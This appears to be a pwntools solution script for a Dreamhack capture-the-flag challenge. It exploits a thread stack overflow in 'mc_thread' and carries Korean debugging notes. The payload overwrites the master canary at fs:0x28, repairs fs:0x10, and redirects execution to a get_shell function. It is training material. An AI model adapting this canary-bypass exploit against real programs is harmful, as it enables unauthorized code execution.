from pwn import *
# p = remote("host8.dreamhack.games", 15966)
p = process("././Adv/Master_Canary/mc_thread")
e = ELF("./Adv/Master_Canary/mc_thread")

get_shell = 0x401256
# pwndbg> p/x $rbp-0x110 : thread의 변수는 fs_base와 가까운 곳에 매핑된다. 바이너리 영역이 아님.
# $8 = 0x7ffff7d9fdb0
# pwndbg> p/x ($fs_base+0x28) - (0x7ffff7d9fdb0)
# $10 = 0x938 : 마스터카나리 주소 - rbp-0x110(BOF vuln) 덮어씌워보자.
# fs:0x10 ~ rbp-0x110 = 0x920

payload = b"A"*0x108 + b"B"*0x8 + b"C"*0x8 + p64(get_shell) + b"A"*(0x920 - 0x120) + \
            p64(0x404800) + b"A"*16 + b"B"*0x8

size = len(payload) // 8 # + 0x8 #read의 반환값이 항상 8이어야 함. 커도 안되고 작아도 안됨.
p.sendlineafter(b"Size: ", str(size).encode())

p.sendafter(b"Data: ", payload)

p.interactive()

# 문제 상황 해설 [Detail in Notion]
## 0. gdb ./mc_thread 와 gdb.attach(p) 의 주소 매핑이 달라 당황했지만, 
## 0. 이는 no-pie 여서 offset은 변화가 없기에 문제되지 않는다고 함.
# 1. 마스터 카나리를 덮어씌우려고 하니 스레드 관련 함수가 [rax+0x308]을 참조하는데 b"A"로 덮어씌워져 문제 발생
# 2. rax에 정상적인 값이 들어가지 않아서 발생하는데 mov rax, fs:0x10에 의해 rax가 b"A"로 가득 채워짐.
# 3. 그래서 fs:0x10 자리에 적당히 쓰기 가능한 영역인 vmmap에서의 영역의 중간 정도를 넣음.
# 4. 그리고 fs:0x10 ~ fs:0x28은 16byte diff 이므로, 추가적으로 채워주고 
# 5. 마스터 카나리를 b"BBBBBBBB"로 채움. 
# 6. Exploit Success.